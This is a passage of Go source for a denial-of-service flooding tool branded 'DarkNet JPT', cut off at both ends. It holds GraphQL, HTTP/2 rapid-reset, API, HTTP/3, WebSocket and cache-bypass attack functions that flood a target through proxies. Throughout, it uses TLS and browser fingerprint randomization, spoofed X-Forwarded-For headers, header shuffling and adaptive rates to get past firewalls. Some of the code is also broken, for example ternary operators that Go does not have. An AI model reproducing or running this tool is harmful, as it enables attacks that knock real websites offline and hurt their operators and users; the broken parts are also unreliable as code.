				networkUsage += float64(len([]byte(req.URL.String())))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] H2multi request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer resp.Body.Close()
				data, _ := io.ReadAll(resp.Body)
				if len(data) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(data))
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode)
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(data))
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassH2multi := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Accept-Encoding"] = []string{"gzip", "deflate", "br"}[rand.Intn(3)]
			req, _ := http.NewRequest("GET", target+parsed.Path, nil)
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassH2multi()
}

func graphqlAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	queryDepth := options.queryDepth
	if queryDepth == 0 {
		queryDepth = 3
	}
	graphqlQuery := fmt.Sprintf(`query IntrospectionQuery%s { __schema { types { name fields(includeDeprecated: true) { name args { name type { name kind ofType { name kind } } } } } } }`, ra())
	for i := 1; i < queryDepth; i++ {
		graphqlQuery = fmt.Sprintf(`query IntrospectionQuery%s { __schema { types { name fields(includeDeprecated: true) { name args { name type { name kind ofType { name kind } } } } } } }`, ra())
	}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig:     randomizeTLSConfig(),
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
			Proxy: http.ProxyURL(&url.URL{
				Scheme: "http",
				Host:   proxyHost + ":" + proxyPort,
			}),
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers["Host"] = parsed.Host
				headers["Accept"] = "application/json"
				headers["Content-Type"] = "application/json"
				headers["Accept-Encoding"] = options.compression
				headers["Connection"] = "keep-alive"
				if options.hcookie != "" {
					headers["Cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["Referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				postData, err := json.Marshal(map[string]string{"query": graphqlQuery})
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] JSON marshal error: %v", err)
					continue
				}
				req, _ := http.NewRequest("POST", target+path, bytes.NewReader(postData))
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len(postData))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] GraphQL request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer resp.Body.Close()
				data, _ := io.ReadAll(resp.Body)
				if len(data) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(data))
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode)
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(data))
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassGraphQL := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Content-Type"] = "application/json"
			postData, _ := json.Marshal(map[string]string{"query": fmt.Sprintf("query { ping%s }", ra())})
			req, _ := http.NewRequest("POST", target+parsed.Path, bytes.NewReader(postData))
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassGraphQL()
}

func rapidResetAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &http.Client{
		Transport: &http2.Transport{
			TLSClientConfig:    randomizeTLSConfig(),
			MaxConcurrentStreams: uint32(options.maxStreams),
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				conn, err := net.DialTimeout("tcp", proxyHost+":"+proxyPort, 2*time.Second)
				if err != nil {
					return nil, err
				}
				fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", parsed.Host, parsed.Host)
				buf := make([]byte, 1024)
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := conn.Read(buf)
				if err != nil || !strings.Contains(string(buf[:n]), "200") {
					conn.Close()
					return nil, fmt.Errorf("proxy connect failed")
				}
				return tls.Client(conn, cfg), nil
			},
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers[":method"] = "GET"
				headers[":authority"] = parsed.Host
				headers[":scheme"] = parsed.Scheme
				headers[":path"] = path
				req, _ := http.NewRequest("GET", target+path, nil)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len([]byte(req.URL.String())))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] Rapid reset request error: %v", err)
					continue
				}
				resp.Body.Close()
				// Simulate RST_STREAM by closing connection immediately
				if tr, ok := client.Transport.(*http2.Transport); ok {
					if conn, err := tr.DialTLS(context.Background(), "tcp", parsed.Host+":443", randomizeTLSConfig()); err == nil {
						conn.Close()
					}
				}
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassRapidReset := func() {
		if rand.Float64() < 0.3 {
			conn, err := net.DialTimeout("tcp", proxyHost+":"+proxyPort, 2*time.Second)
			if err != nil {
				return
			}
			defer conn.Close()
			fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", parsed.Host, parsed.Host)
			conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
			conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + parsed.Host + "\r\n\r\n"))
			conn.Close()
		}
	}
	go bypassRapidReset()
}
func apiAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &fasthttp.Client{
		TLSConfig:           randomizeTLSConfig(),
		MaxIdleConnDuration: 30 * time.Second,
		MaxConnDuration:     10 * time.Second,
		MaxConnsPerHost:     100,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				req := fasthttp.AcquireRequest()
				req.SetRequestURI(target + path)
				req.Header.SetMethod(reqmethod)
				headers := generateBrowserConfig(options.fingerprint)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				if options.hcookie != "" {
					req.Header.Set("Cookie", options.hcookie)
				}
				if options.refererValue != "" {
					req.Header.Set("Referer", options.refererValue)
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							req.Header.Set(parts[0], parts[1])
						}
					}
				}
				if reqmethod == "POST" {
					req.SetBody([]byte(generatePostData(options)))
				}
				req.Header.Set("Host", parsed.Host)
				req.Header.Set("Accept", "application/json")
				req.Header.Set("Accept-Encoding", options.compression)
				req.Header.Set("Connection", "keep-alive")
				resp := fasthttp.AcquireResponse()
				err := client.DoTimeout(req, resp, 10*time.Second)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len(req.String()))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] API request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					fasthttp.ReleaseRequest(req)
					fasthttp.ReleaseResponse(resp)
					continue
				}
				if len(resp.Body()) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(resp.Body()))
					fasthttp.ReleaseRequest(req)
					fasthttp.ReleaseResponse(resp)
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode())
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(resp.Body()))
				logStatsToFile()
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(resp)
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassAPI := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			req := fasthttp.AcquireRequest()
			req.SetRequestURI(target + parsed.Path)
			req.Header.SetMethod("GET")
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.DoTimeout(req, nil, 10*time.Second)
			fasthttp.ReleaseRequest(req)
		}
	}
	go bypassAPI()
}

func http3Attack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &http.Client{
		Transport: &http3.RoundTripper{
			TLSClientConfig: randomizeTLSConfig(),
			Dial: func(network, addr string, cfg *tls.Config, _ *quic.Config) (quic.EarlyConnection, error) {
				conn, err := net.DialTimeout("udp", proxyHost+":"+proxyPort, 2*time.Second)
				if err != nil {
					return nil, err
				}
				udpConn, ok := conn.(*net.UDPConn)
				if !ok {
					conn.Close()
					return nil, fmt.Errorf("invalid UDP connection")
				}
				return quic.DialEarly(context.Background(), udpConn, nil, parsed.Host, cfg, &quic.Config{})
			},
		},
		Timeout: 10 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.randomstring != "" {
					path = strings.ReplaceAll(path, "%RAND%", ra()) + fmt.Sprintf("?%s=%s", options.randomstring, generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				headers := generateBrowserConfig(options.fingerprint)
				headers[":method"] = reqmethod
				headers[":authority"] = parsed.Host
				headers[":scheme"] = "https"
				headers[":path"] = path
				headers["Accept"] = "application/json"
				headers["Accept-Encoding"] = options.compression
				if options.hcookie != "" {
					headers["cookie"] = options.hcookie
				}
				if options.refererValue != "" {
					headers["referer"] = options.refererValue
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							headers[parts[0]] = parts[1]
						}
					}
				}
				var body io.Reader
				if reqmethod == "POST" {
					body = strings.NewReader(generatePostData(options))
				}
				req, _ := http.NewRequest(reqmethod, target+path, body)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				for _, k := range headerKeys {
					req.Header.Set(k, headers[k])
				}
				resp, err := client.Do(req)
				atomic.AddInt64(&totalRequests, 1)
				networkUsage += float64(len([]byte(req.URL.String())))
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] HTTP/3 request error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer resp.Body.Close()
				data, _ := io.ReadAll(resp.Body)
				if len(data) > 1024*1024 {
					log.Printf("[DarkNet JPT] [WARN] Response too large: %d bytes", len(data))
					continue
				}
				status := fmt.Sprintf("%d", resp.StatusCode)
				log.Printf("[DarkNet JPT] [SEND] %s ...", status)
				mutex.Lock()
				statusCodeStats[status]++
				if status == "403" || status == "429" {
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
				}
				mutex.Unlock()
				if slices.Contains([]string{"200", "201", "202"}, status) {
					atomic.AddInt64(&successRequests, 1)
				} else {
					atomic.AddInt64(&failedRequests, 1)
				}
				updateProxyStats(proxy, slices.Contains([]string{"200", "201", "202"}, status)?1:0, !slices.Contains([]string{"200", "201", "202"}, status)?1:0, len(data))
				logStatsToFile()
			}
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				atomic.StoreInt64(&bot.currentRate, newRate)
			}
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()
	bypassHTTP3 := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			req, _ := http.NewRequest("GET", target+parsed.Path, nil)
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				req.Header.Set(k, headers[k])
			}
			client.Do(req)
		}
	}
	go bypassHTTP3()
}

func wsAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	wsTarget := strings.Replace(target, "http", "ws", 1)
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	dialer := &websocket.Dialer{
		Proxy: http.ProxyURL(&url.URL{
			Scheme: "http",
			Host:   proxyHost + ":" + proxyPort,
		}),
		TLSClientConfig:  randomizeTLSConfig(),
		HandshakeTimeout: 2 * time.Second,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				// Generate randomized headers for WebSocket connection
				headers := generateBrowserConfig(options.fingerprint)
				headerKeys := make([]string, 0, len(headers))
				for k := range headers {
					headerKeys = append(headerKeys, k)
				}
				rand.Shuffle(len(headerKeys), func(i, j int) {
					headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
				})
				httpHeader := http.Header{}
				for _, k := range headerKeys {
					httpHeader.Set(k, headers[k])
				}
				if options.hcookie != "" {
					httpHeader.Set("Cookie", options.hcookie)
				}
				if options.refererValue != "" {
					httpHeader.Set("Referer", options.refererValue)
				}
				if options.customHeaders != "" {
					for _, header := range strings.Split(options.customHeaders, "#") {
						parts := strings.SplitN(header, "=", 2)
						if len(parts) == 2 {
							httpHeader.Set(parts[0], parts[1])
						}
					}
				}

				// Establish WebSocket connection
				conn, _, err := dialer.Dial(wsTarget, httpHeader)
				if err != nil {
					log.Printf("[DarkNet JPT] [WARN] WebSocket connect error: %v", err)
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
					continue
				}
				defer conn.Close()

				// Set read limit to prevent DoS from server
				conn.SetReadLimit(1024 * 1024)

				// Send randomized messages
				messageCount := 10
				if options.burst > 0 {
					messageCount = options.burst
				}
				for i := 0; i < messageCount; i++ {
					message := generateRandomString(100, options.payloadSize)
					err := conn.WriteMessage(websocket.TextMessage, []byte(message))
					if err != nil {
						log.Printf("[DarkNet JPT] [WARN] WebSocket write error: %v", err)
						atomic.AddInt64(&failedRequests, 1)
						updateProxyStats(proxy, 0, 1, len(message))
						logStatsToFile()
						break
					}
					atomic.AddInt64(&totalRequests, 1)
					networkUsage += float64(len(message))
					log.Printf("[DarkNet JPT] [SEND] WebSocket message sent ...")
					atomic.AddInt64(&successRequests, 1)
					updateProxyStats(proxy, 1, 0, len(message))
					logStatsToFile()

					// Random delay to avoid pattern detection
					time.Sleep(time.Millisecond * time.Duration(rand.Intn(100)))
				}

				// Read response to detect blocks
				conn.SetReadDeadline(time.Now().Add(2 * time.Second))
				_, _, err = conn.ReadMessage()
				if err != nil && !websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
					log.Printf("[DarkNet JPT] [WARN] WebSocket read error: %v", err)
					mutex.Lock()
					blockedProxies[proxy] = true
					log.Printf("[DarkNet JPT] [WARN] Proxy %s blocked by target firewall", proxy)
					mutex.Unlock()
					atomic.AddInt64(&failedRequests, 1)
					updateProxyStats(proxy, 0, 1, 0)
					logStatsToFile()
				}
			}

			// Adaptive rate adjustment
			if options.autorate && bot.successRate < 0.5 {
				newRate := int64(float64(currentRate) * 0.8)
				if newRate < 10 {
					newRate = 10
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			} else if options.autorate && bot.successRate > 0.9 {
				newRate := int64(float64(currentRate) * 1.2)
				if newRate > int64(options.rate*2) {
					newRate = int64(options.rate * 2)
				}
				atomic.StoreInt64(&bot.currentRate, newRate)
			}

			// Poisson interval for natural request pacing
			time.Sleep(getPoissonInterval(float64(currentRate) / 1000))
		}
	}()

	bypassWebSocket := func() {
		if rand.Float64() < 0.3 {
			headers := generateBrowserConfig("random")
			headers["X-Forwarded-For"] = generateRandomIP()
			headers["Sec-WebSocket-Key"] = base64.StdEncoding.EncodeToString([]byte(generateRandomString(16, 16)))
			httpHeader := http.Header{}
			headerKeys := make([]string, 0, len(headers))
			for k := range headers {
				headerKeys = append(headerKeys, k)
			}
			rand.Shuffle(len(headerKeys), func(i, j int) {
				headerKeys[i], headerKeys[j] = headerKeys[j], headerKeys[i]
			})
			for _, k := range headerKeys {
				httpHeader.Set(k, headers[k])
			}
			conn, _, err := dialer.Dial(wsTarget, httpHeader)
			if err != nil {
				return
			}
			defer conn.Close()
			conn.WriteMessage(websocket.TextMessage, []byte("ping"))
		}
	}
	go bypassWebSocket()
}

func cacheBypassAttack(proxy, target, reqmethod string, rate int, options Options, bot *Bot) {
	parsed, err := url.Parse(target)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid URL: %s", target)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	parts := strings.Split(proxy, ":")
	if len(parts) != 2 {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy format: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	proxyHost, proxyPort := parts[0], parts[1]
	if proxyHost == "" || proxyPort == "" {
		log.Printf("[DarkNet JPT] [ERROR] Invalid proxy host or port: %s", proxy)
		atomic.AddInt64(&failedRequests, 1)
		updateProxyStats(proxy, 0, 1, 0)
		return
	}
	validMethods := []string{"GET", "POST", "HEAD"}
	reqmethod = strings.ToUpper(reqmethod)
	if !slices.Contains(validMethods, reqmethod) {
		log.Printf("[DarkNet JPT] [WARN] Invalid HTTP method: %s. Defaulting to GET", reqmethod)
		reqmethod = "GET"
	}
	if rate <= 0 {
		log.Printf("[DarkNet JPT] [WARN] Invalid rate: %d. Defaulting to 100", rate)
		rate = 100
	}
	client := &fasthttp.Client{
		TLSConfig:           randomizeTLSConfig(),
		MaxIdleConnDuration: 30 * time.Second,
		MaxConnDuration:     10 * time.Second,
		MaxConnsPerHost:     100,
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		currentRate := int64(rate)
		if options.autorate {
			currentRate = atomic.LoadInt64(&bot.currentRate)
		}
		for {
			for j := 0; j < int(currentRate); j++ {
				path := parsed.Path
				if parsed.RawQuery != "" {
					path += "?" + parsed.RawQuery
				}
				if options.cacheBypass {
					path += fmt.Sprintf("?cachebypass=%s", generateRandomString(12, 12))
				} else {
					path = strings.ReplaceAll(path, "%RAND%", ra())
				}
				req := fasthttp.AcquireRequest()
				req.SetRequestURI(target + path)
				req.Header.SetMethod(reqmethod)
				headers := generateBrowserConfig(options.fingerprint)
